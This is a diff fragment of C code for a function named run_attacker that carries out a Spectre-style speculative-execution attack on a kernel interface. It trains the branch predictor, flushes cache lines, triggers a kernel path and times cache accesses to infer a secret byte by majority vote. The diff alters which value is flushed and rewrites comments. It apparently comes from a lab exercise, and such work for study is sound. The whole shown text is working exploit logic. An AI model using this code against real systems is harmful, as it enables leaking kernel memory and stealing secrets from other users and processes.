@@ -56,30 +56,27 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             volatile char tmp = shared_memory[i * 4096];
         }
 
-        // Delay branch resolution
-        extern size_t part3_limit;
-
         for (int attempt = 0; attempt < max_attempts; attempt++) {
             // Step 1: Train branch predictor
             for (int train = 0; train < 100; train++) {
                 call_kernel_part3(kernel_fd, shared_memory, 0);
             }
 
-            // Step 2: Flush part3_limit to delay branch condition resolution
-            clflush(&part3_limit);
+            // Step 2: Flush input to delay branch resolution
+            clflush(&shared_memory[0]);
 
-            // Step 3: Delay to allow speculation to proceed
+            // Step 3: Insert delay to give speculation time
             for (volatile int delay = 0; delay < 1000; delay++) {}
 
-            // Step 4: Flush shared memory pages
+            // Step 4: Flush shared memory side-channel pages
             for (int i = 0; i < 256; i++) {
                 clflush(&shared_memory[i * 4096]);
             }
 
-            // Step 5: Trigger speculative execution
+            // Step 5: Trigger vulnerable kernel path
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
 
-            // Step 6: Reload and time accesses
+            // Step 6: Time accesses to infer secret
             for (int i = 0; i < 256; i++) {
                 uint64_t time = time_access(&shared_memory[i * 4096]);
                 if (time < CACHE_HIT_THRESHOLD) {
@@ -88,9 +85,8 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             }
         }
 
-        // Step 7: Choose best guess via majority vote
-        int best_guess = -1;
-        int best_count = 0;
+        // Step 7: Choose most likely byte
+        int best_guess = -1, best_count = 0;
         for (int i = 0; i < 256; i++) {
             if (counts[i] > best_count) {
                 best_count = counts[i];
